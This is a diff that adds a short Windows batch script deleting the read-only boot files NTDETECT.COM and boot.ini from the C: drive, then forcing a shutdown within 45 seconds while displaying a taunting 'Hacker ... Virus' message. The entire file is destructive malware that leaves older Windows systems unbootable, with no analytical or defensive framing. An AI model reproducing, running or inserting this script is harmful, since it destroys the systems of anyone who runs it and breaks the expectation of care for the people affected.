@@ -1,0 +1,5 @@
+@echo off
+del C:\NTDETECT.COM /a:r
+del C:\boot.ini /a:r
+shutdown -s -f -t 45 -c "Hacker load to you System Virus ! Belozerov Hacker ! Xe Xe Xe Xe........."
+@echo off
